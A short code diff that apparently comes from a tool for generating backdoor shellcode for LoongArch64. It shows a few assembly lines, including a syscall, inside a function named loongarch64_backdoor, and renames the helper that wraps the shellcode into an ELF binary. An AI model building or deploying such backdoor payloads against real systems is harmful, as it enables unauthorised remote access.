@@ -36,6 +36,6 @@ addi.d	$r12,$r22,-40(0xfd8)
 ori	$r11,$r0,0xc6
 syscall 0x0
     '''
-    my_package.my_make_loongarch64_elf(shellcode)
+    my_package.my_make_add_arch_elf(shellcode)
 
 loongarch64_backdoor()
